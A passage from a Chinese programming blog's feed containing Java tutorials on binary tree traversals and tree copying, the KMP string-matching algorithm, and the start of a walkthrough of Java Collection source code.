class="keyword">if</span> (node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right)) &#123;</span><br><span class="line">            visitor.visit(node.right);</span><br><span class="line">            visited.add(node.right);</span><br><span class="line">            stack.push(node.right);</span><br><span class="line">            node = node.right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 左右节点都没有了就弹栈，查看父节点的右节点</span></span><br><span class="line">            node = stack.pop();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="中序遍历"><a href="#中序遍历" class="headerlink" title="中序遍历"></a>中序遍历</h2><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorder1</span><span class="params">(Visitor visitor)</span></span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span> || visitor.stop) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    inorder1(root.left,visitor);</span><br><span class="line">    <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">    visitor.visit(root);</span><br><span class="line">    inorder1(root.right,visitor);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">inorder2</span><span class="params">(Visitor visitor)</span></span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    stack.push(node);</span><br><span class="line">    <span class="keyword">while</span>(node.left != <span class="keyword">null</span>) &#123; <span class="comment">//一直找到最左节点</span></span><br><span class="line">        stack.push(node.left);</span><br><span class="line">        node = node.left;</span><br><span class="line">    &#125;</span><br><span class="line">    node = stack.pop();</span><br><span class="line">    <span class="keyword">while</span>(visited.size() &lt; size) &#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">            stack.push(node); <span class="comment">//有左节点才需要把该节点位置保存，否则直接访问</span></span><br><span class="line">            node = node.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">            visitor.visit(node);</span><br><span class="line">            visited.add(node);  <span class="comment">//先访问父节点，后判断是否有右节点</span></span><br><span class="line">            <span class="keyword">if</span>(node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right)) &#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = stack.pop();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="后序遍历"><a href="#后序遍历" class="headerlink" title="后序遍历"></a>后序遍历</h2><p>递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postorder1</span><span class="params">(Visitor visitor)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root==<span class="keyword">null</span> || visitor.stop) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    postorder1(root.left,visitor);</span><br><span class="line">    postorder1(root.right,visitor);</span><br><span class="line">    <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">    visitor.visit(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>非递归：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">postorder2</span><span class="params">(TreeNode&lt;E&gt; root,Visitor visitor)</span></span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    stack.push(node);</span><br><span class="line">    <span class="keyword">while</span>(node.left != <span class="keyword">null</span>) &#123;</span><br><span class="line">        stack.push(node.left);</span><br><span class="line">        node = node.left;</span><br><span class="line">    &#125;</span><br><span class="line">    node = stack.pop();</span><br><span class="line">    <span class="keyword">while</span>(visited.size() &lt; size) &#123;</span><br><span class="line">        <span class="keyword">if</span>((node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) ||</span><br><span class="line">           (node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right))) &#123;  <span class="comment">//只有有需要访问的子节点</span></span><br><span class="line">            stack.push(node);  <span class="comment">//要访问子节点了，先把这个节点保存起来</span></span><br><span class="line">            <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">                node = node.left;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                node = node.right;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(visitor.stop) <span class="keyword">return</span>;</span><br><span class="line">            visitor.visit(node);</span><br><span class="line">            visited.add(node); <span class="comment">//当左右节点访问完了，再访问父节点</span></span><br><span class="line">            node = stack.pop(); <span class="comment">//访问完这棵子树，弹栈</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="层序遍历"><a href="#层序遍历" class="headerlink" title="层序遍历"></a>层序遍历</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">levelorder</span><span class="params">(Visitor visitor)</span></span>&#123;</span><br><span class="line">    Queue&lt;TreeNode&lt;E&gt;&gt; queue = <span class="keyword">new</span> LinkedQueue&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    queue.offer(root);</span><br><span class="line">    <span class="keyword">while</span>(!queue.isEmpty())&#123;</span><br><span class="line">        TreeNode&lt;E&gt; node = queue.poll();</span><br><span class="line">        <span class="keyword">if</span>(visitor.stop) <span class="keyword">break</span>;</span><br><span class="line">        visitor.visit(node);</span><br><span class="line">        <span class="keyword">if</span>(node.left!=<span class="keyword">null</span>) queue.offer(node.left);</span><br><span class="line">        <span class="keyword">if</span>(node.right!=<span class="keyword">null</span>) queue.offer(node.right);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="应用"><a href="#应用" class="headerlink" title="应用"></a>应用</h1><h2 id="计算树的高度"><a href="#计算树的高度" class="headerlink" title="计算树的高度"></a>计算树的高度</h2><h2 id="计算树的节点数量"><a href="#计算树的节点数量" class="headerlink" title="计算树的节点数量"></a>计算树的节点数量</h2><h2 id="复制树"><a href="#复制树" class="headerlink" title="复制树"></a>复制树</h2><p>非递归：(先序遍历)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> BinaryTree&lt;E&gt; <span class="title">copy</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    TreeNode&lt;E&gt; newRoot = <span class="keyword">new</span> TreeNode&lt;&gt;(root.element);</span><br><span class="line">    TreeNode&lt;E&gt; p = newRoot;</span><br><span class="line">    TreeNode&lt;E&gt; node = root;</span><br><span class="line">    List&lt;TreeNode&lt;E&gt;&gt; visited = <span class="keyword">new</span> LinkedList&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    Stack&lt;TreeNode&lt;E&gt;&gt; stack = <span class="keyword">new</span> LinkedStack&lt;TreeNode&lt;E&gt;&gt;();</span><br><span class="line">    visited.add(newRoot);</span><br><span class="line">    <span class="keyword">while</span> (visited.size() != size) &#123;</span><br><span class="line">        <span class="keyword">if</span>(node.left != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.left)) &#123;</span><br><span class="line">            stack.push(node);</span><br><span class="line">            TreeNode&lt;E&gt; newNode = <span class="keyword">new</span> TreeNode&lt;E&gt;(node.left.element);</span><br><span class="line">            visited.add(node.left);</span><br><span class="line">            p.left = newNode;</span><br><span class="line">            newNode.parent = p;</span><br><span class="line">            node = node.left;</span><br><span class="line">            p = p.left;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(node.right != <span class="keyword">null</span> &amp;&amp; !visited.contains(node.right)) &#123;</span><br><span class="line">            stack.push(node);  <span class="comment">// p只能按照parent的顺序返回，因此这里即使已经访问完这棵子树，仍需要将node压入栈中保存位置，否则node会与p不同步</span></span><br><span class="line">            TreeNode&lt;E&gt; newNode = <span class="keyword">new</span> TreeNode&lt;E&gt;(node.right.element);</span><br><span class="line">            visited.add(node.right);</span><br><span class="line">            p.right = newNode;</span><br><span class="line">            newNode.parent = p;</span><br><span class="line">            node = node.right;</span><br><span class="line">            p = p.right;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            node = stack.pop();</span><br><span class="line">            p = p.parent;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    BinaryTree&lt;E&gt; newTree = <span class="keyword">new</span> BinaryTree&lt;&gt;();</span><br><span class="line">    newTree.size = size;</span><br><span class="line">    newTree.root = newRoot;</span><br><span class="line">    <span class="keyword">return</span> newTree;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;介绍树的三种非递归遍历代码的Java实现及应用。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="树" scheme="https://www.fvolcano.red/tags/%E6%A0%91/"/>
    
  </entry>
  
  <entry>
    <title>KMP字符串匹配算法图解</title>
    <link href="https://www.fvolcano.red/2020/KMP-elaboration/"/>
    <id>https://www.fvolcano.red/2020/KMP-elaboration/</id>
    <published>2020-10-02T00:56:17.000Z</published>
    <updated>2020-10-02T00:56:17.000Z</updated>
    
    <content type="html"><![CDATA[<p>KMP算法是字符串匹配算法中对暴力匹配算法的优化。我尽量用容易理解的方法把它写 &amp; 画清楚。<a id="more"></a></p><h1 id="BF"><a href="#BF" class="headerlink" title="BF"></a>BF</h1><p>暴力破解。这是最朴素的一种解决方案：从文本串（即被匹配的大字符串，以下都是）的第一个字符开始，一位一位地与模式串（即搜索的关键字，以下都是）的对应位置相比较。</p><p><img src="/2020/KMP-elaboration/%E5%8C%B9%E9%85%8D%E7%AE%97%E6%B3%951.png" alt="暴力算法"></p><p>设文本串(p)的长度为m，模式串(s)的长度为n。i，j分别是指向文本串、模式串的游标。</p><p>while（i &lt; m) {</p><p>​    if (p[i] != s[j]) {</p><p>​        i++;  j = 0;</p><p>​    } else {</p><p>​        i++;  j++;</p><p>​    }</p><p>}</p><p>但可想而知，这样的匹配算法时间复杂度几乎为O(mn)。但仔细想想，我们确实没必要再比较上图中第二步的a与b，因为在第一步已经比较到了文本串的b，我们应该让程序“记住”它比较过了的东西，在明显与模式串的第一个字符不相同后，就应该去掉第二步。</p><p>但我们不能真的去把之前比较过的数据保存起来，那样既增加了空间开销，又没能达到优化的目的。于是，KMP就要登场了，它能帮程序不用像傻子一样（虽然它就是）一个一个地比较下去。</p><h1 id="KMP"><a href="#KMP" class="headerlink" title="KMP"></a>KMP</h1><h2 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h2><p>有一种巧妙的方法。因为假设比较到第k位就失配了（崩了），那么有一个事实是可以确定的：两个串前k-1个字符肯定是相同的。那么！因为模式串是已经定好的，在匹配到j == k时停下来，我们（程序）就知道在文本串中 [i-j, i-1]的字符是什么了。那么知道了以后呢？我们的目的是不要像暴力算法那样一个个比，那就得跳过一些，但又不能把能匹配得上的给跳过了，那么我们就需要看已知的（已经比较过的）文本串中有没有跟模式串开头相同的字符（串）了。<strong>没有的话就可以直接跳过前j个</strong>，有的话就跳到相同的那一部分继续往下比较。</p><p>这里面有一个小点，既然我们已经知道其中有连续的几个是与模式串的前缀（即前面连续的几个）是相同的，那么也没必要再比较了，直接从文本串中程序“未知的”那一个位置继续下去。</p><p>如下图，前面三个aba已知，同时模式串a又能与aba中第二个a匹配，那么就直接把模式串移到<strong>模式串开头的a与aba中第二个a</strong>匹配的位置，同时把模式串的游标j移到a后面的b，从它开始比较。</p><p><img src="/2020/KMP-elaboration/KMP.png" alt="KMP"></p><p>可是，问题又来了。怎么要让程序知道应该跳过其中的多少步呢？</p><p>这就又要归功于模式串的<u>已知</u>和<u>不变</u>了，我们现在的任务是什么？我们现在的任务就是在一段已知的字符串（即已经比较过的那一段，也即模式串的一个前缀，上图中的aba）中找是不是有（<strong>它的</strong>）前缀后缀相同的地方啊。如上图，前后缀相同的就是a。</p><p>相同有什么用呢？因为我们要找相同的这一段恰好就是模式串的前缀，且我们是在这一段字符的下一个字符失配的，我们找到这一个字符串中后面某几位是否与前面的某几位相同，就可以知道这里面有没有我们需要移动模式串的位置再匹配一下的地方了。</p><p>那么，我们可以针对模式串建立一个数组 next[]。next[m]里面存储的是若在（模式串）第m位失配，下一次比较中模式串的游标应该要指向的位置。<strong>文本串的游标不变</strong>。当需要用到next[i]时，说明前面i-1个字符都是匹配的，到了第i个不相同，那么就需要在<strong>前i-1个字符组成的字符串中</strong>找是否有相同的前后缀。</p><h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><p>由此可以写出kmp基本代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">kmp</span><span class="params">(String p, String s)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(s == <span class="keyword">null</span> || s.length() == <span class="number">0</span>) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">int</span>[] next = <span class="keyword">new</span> <span class="keyword">int</span>[s.length()];</span><br><span class="line">    <span class="comment">//initNext1(s, next);</span></span><br><span class="line">    initNext2(s, next);</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">0</span>, j=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;p.length() &amp;&amp; j&lt;s.length()) &#123;</span><br><span class="line">        <span class="keyword">if</span>(p.charAt(i) == s.charAt(j)) &#123;</span><br><span class="line">            i++;</span><br><span class="line">            j++;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="number">0</span>) &#123;  </span><br><span class="line">            <span class="comment">// 因为将next[0]设置为-1，代表需要移动文本串游标</span></span><br><span class="line">            <span class="comment">// 因此需要将j==0的情况单独抽离出来，防止下标越界（j被赋值为-1）</span></span><br><span class="line">            i++;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            j = next[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(j == s.length()) <span class="keyword">return</span> i - j + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>initNext（生成next数组）有两种方法：数学归纳法和先前搜索法。</p><h2 id="生成next数组"><a href="#生成next数组" class="headerlink" title="生成next数组"></a>生成next数组</h2><p>将next[0]设置为-1，代表需要移动文本串游标。若设置为0，则在第一个字符就失配的情况下会陷入死循环。next[1] = 0：若第二个字符失配，则将模式串向后移1位，即游标指向0，从头开始。</p><h3 id="数学归纳法"><a href="#数学归纳法" class="headerlink" title="数学归纳法"></a>数学归纳法</h3><p>假设next[j]已知，求出next[j+1]的值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 生成next数组（数学归纳法）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initNext1</span><span class="params">(String s, <span class="keyword">int</span>[] next)</span> </span>&#123;</span><br><span class="line">    next[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(next.length == <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> j = <span class="number">1</span>, k = next[j];  <span class="comment">// next[0]已经确定，从next[1]开始生成，j=1</span></span><br><span class="line">    <span class="keyword">while</span>(j + <span class="number">1</span> &lt; next.length) &#123;  <span class="comment">// 确定j后面还有字符（存在失配可能）</span></span><br><span class="line">        <span class="keyword">while</span>(k != -<span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(j) == s.charAt(k)) &#123; </span><br><span class="line">                next[j+<span class="number">1</span>] = k + <span class="number">1</span>;   <span class="comment">// k=next[j]</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                k = next[k];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(k == -<span class="number">1</span>) next[j+<span class="number">1</span>] = <span class="number">0</span>;  <span class="comment">// 说明S0 != Sj</span></span><br><span class="line">        j++;</span><br><span class="line">        k = next[j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/KMP-elaboration/next.jpg" alt="next"></p><h3 id="向前搜索法"><a href="#向前搜索法" class="headerlink" title="向前搜索法"></a>向前搜索法</h3><p>朴素解法。从前缀 &amp; 后缀的后面开始比较。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 生成next数组（向前搜索）</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">initNext2</span><span class="params">(String s, <span class="keyword">int</span>[] next)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(next.length == <span class="number">1</span>) &#123;</span><br><span class="line">        next[<span class="number">0</span>] = -<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    next[<span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>; i&lt;s.length(); i++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j=i-<span class="number">1</span>; j&gt;=<span class="number">0</span>; j--) &#123;</span><br><span class="line">            <span class="keyword">boolean</span> find = <span class="keyword">true</span>;</span><br><span class="line">            <span class="keyword">if</span>(s.charAt(i) == s.charAt(j)) &#123;</span><br><span class="line">                <span class="keyword">int</span> i1 = i, j1 = j;</span><br><span class="line">                <span class="keyword">while</span>(j1 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span>(s.charAt(i1) == s.charAt(j1)) &#123;</span><br><span class="line">                        i1--;</span><br><span class="line">                        j1--;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        find = <span class="keyword">false</span>;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(find) &#123;</span><br><span class="line">                    next[i] = j;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(j == <span class="number">0</span>) next[i] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2020/KMP-elaboration/next2.jpg" alt="next2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;KMP算法是字符串匹配算法中对暴力匹配算法的优化。我尽量用容易理解的方法把它写 &amp;amp; 画清楚。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="图解" scheme="https://www.fvolcano.red/tags/%E5%9B%BE%E8%A7%A3/"/>
    
  </entry>
  
  <entry>
    <title>Java Collection及其实现源码</title>
    <link href="https://www.fvolcano.red/2020/Java-Collection-sourcecode/"/>
    <id>https://www.fvolcano.red/2020/Java-Collection-sourcecode/</id>
    <published>2020-10-02T00:56:17.000Z</published>
    <updated>2020-10-02T00:56:17.000Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2020/Java-Collection-sourcecode/Collection.jpg" alt="Collection"></p><a id="more"></a><p>各接口、抽象类作用：</p><ul><li><p><strong>RandomAccess</strong> 是一个标记接口，用于标记实现该接口的集合支持快速随机访问。</p></li><li><p><strong>Serializable</strong> 是一个标记接口，用于标记实现该接口的类可以序列化。</p></li><li><p><strong>Cloneable</strong> 是一个标记接口，用于标记实现该接口的类可以调用 clone 方法，否则会抛异常。</p></li><li><p><strong>Iterable</strong> 是一个遍历接口，内部提供了支持不同遍历方式的方法，比如顺序遍历迭代器、函数式的 foreach 遍历、并行遍历迭代器。</p></li><li><p><strong>Collection</strong> 是 java 集合体系的根接口，包含了通用的遍历、修改方法，例如 addAll、removeAll。</p></li><li><p><strong>AbstractCollection</strong> 是一个抽象类，重写了 Collection 中最基础的方法，减少具体集合类的实现成本，比如 contains、isEmpty、toArray，iterator，但是 add 等需要具体集合类自我实现。</p></li><li><p><strong>List</strong> 是 java 有序集合的基础接口，除了 Collection 的方法，还有支持倒序遍历的 listIterator 方法、子列表 subList 方法，另外重写 spliterator 方法的实现。</p></li><li><p><strong>AbstractList</strong> 是一个抽象类，重写了 List 的大部分方法，作用跟 AbstractCollection 类似。</p></li></ul><h1 id="List"><a href="#List" class="headerlink" title="List"></a>List</h1><p>List 是一个接口，定义一组有序、可重复的元素集合。</p><p><img src="/2020/Java-Collection-sourcecode/List%E6%96%B9%E6%B3%95.jpg" alt="List方法"></p><p>较之 Collection，List 还添加了以下操作方法</p><ul><li>位置相关：List 的元素是有序的，因此有get(index)、set(index,object)、add(index,object)、remove(index) 方法。</li><li>搜索：indexOf()，lastIndexOf();</li><li>迭代：使用 Iterator 的功能板迭代器</li><li>范围性操作：使用 subList 方法对 list 进行任意范围操作。</li></ul><h2 id="实现类"><a href="#实现类" class="headerlink" title="实现类"></a>实现类</h2><h3 id="AbstractList"><a href="#AbstractList" class="headerlink" title="AbstractList"></a>AbstractList</h3><p>是List的抽象实现类，继承自 AbstractCollection 类。整个类的设计类似于AbstractCollection,实现了大多数方法，抽象了对于需要根据数据操作的方法。</p><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>ArrayList 是我们最常用的一个类，它具有如下特点：</p><ul><li>可以动态扩容</li><li>有序</li><li>元素可以为 null</li><li>效率高<ul><li>查找操作的时间复杂度是 O(1)</li><li>增删操作的时间复杂度是 O(n)</li><li>其他操作基本也都是 O(n)</li></ul></li><li>占用空间少，相比 LinkedList，不用占用额外空间维护表结构</li></ul><p><img src="/2020/Java-Collection-sourcecode/ArrayList.jpg" alt="ArrayList"></p><h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.ensureCapacityInternal(<span class="keyword">this</span>.size + <span class="number">1</span>); <span class="comment">// Increments modCount!!</span></span><br><span class="line">    <span class="keyword">this</span>.elementData[<span class="keyword">this</span>.size++] = var1;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">ensureCapacityInternal</span><span class="params">(<span class="keyword">int</span> minCapacity)</span> </span>&#123;</span><br><span class="line">    